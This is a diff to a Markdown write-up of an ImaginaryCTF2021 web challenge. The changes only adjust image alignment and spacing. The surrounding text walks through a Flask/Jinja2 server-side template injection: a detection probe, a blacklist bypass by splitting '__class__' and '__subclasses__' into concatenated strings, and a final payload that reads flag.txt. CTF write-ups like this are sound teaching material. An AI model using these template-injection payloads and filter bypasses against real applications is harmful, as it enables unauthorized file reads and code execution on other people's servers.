@@ -269,15 +269,12 @@ To detect this vulnerability I checked the following payload since it is a Flask
 { { 7*7 } } 
 ```
 
-
-
-
-<p align="left">
-  <img src="/images/writeups/ImaginaryCTF2021/Web/1_template.png" width="40%"/>
+<p align="center">
+  <img src="/images/writeups/ImaginaryCTF2021/Web/1_template.png" width="60%"/>
 </p>
 
-<p align="right">
-  <img src="/images/writeups/ImaginaryCTF2021/Web/2_executed.png" width="40%"/>
+<p align="center">
+  <img src="/images/writeups/ImaginaryCTF2021/Web/2_executed.png" width="60%"/>
 </p>
 
 As we can see, the code is executed, therefore we can try to explote this vulnerability.
@@ -286,9 +283,7 @@ The purpose is to read the flag file (?) or to execute code in the server. For t
 We use an empty string ("") and access its class attribute. We have some issues with the blacklist implemented in the code ("las", "bas", "bal") but we can bypass it with the following trick:
 
 ```
-
 { {""["__cl" + "ass__"]} }
-
 ```
 
 Now, step up to the MRO:
@@ -298,9 +293,7 @@ Now, step up to the MRO:
 </p>
 
 ```
-
 { {""["__cl" + "ass__"].__mro__} }
-
 ```
 
 <p align="center">
@@ -310,9 +303,7 @@ Now, step up to the MRO:
 Now I use subclasses over the object class to obtain the list of available methods for the object class:
 
 ```
-
 { {""["__cl" + "ass__"].__mro__[1]["__subcl" + "asses__"]()} }
-
 ```
 
 <p align="center">
@@ -375,9 +366,7 @@ Now, the [documentation](https://docs.python.org/3/library/importlib.html) is ch
 Following the documentation, we crafted the following payload:
 
 ```
-
 { {""["__cl" + "ass__"].__mro__[1]["__subcl" + "asses__"]()[99]("flag.txt", "flag.txt").get_data("flag.txt")} }
-
 ```
 
 <p align="center">
